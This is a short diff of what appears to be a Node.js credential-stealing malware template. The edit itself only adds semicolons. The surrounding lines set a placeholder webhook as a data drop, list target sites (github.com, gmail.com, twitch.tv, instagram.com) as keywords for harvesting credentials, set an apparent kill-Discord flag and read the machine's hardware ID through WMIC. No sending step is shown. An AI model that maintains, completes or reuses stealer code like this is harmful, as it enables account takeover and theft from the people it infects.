@@ -18,8 +18,8 @@ const buf_replace = require('buffer-replace');
 let killdcop = true; 
 
 
-const %webhookstring% = "REPLACE_YOUR_WEBHOOK"
-const %keywordstring% = ['github.com','gmail.com','twitch.tv','instagram.com']
+const %webhookstring% = "REPLACE_YOUR_WEBHOOK";
+const %keywordstring% = ['github.com','gmail.com','twitch.tv','instagram.com'];
 
 
 const hwid = execSync('WMIC csproduct get UUID').toString().trim().split('\n')[1];
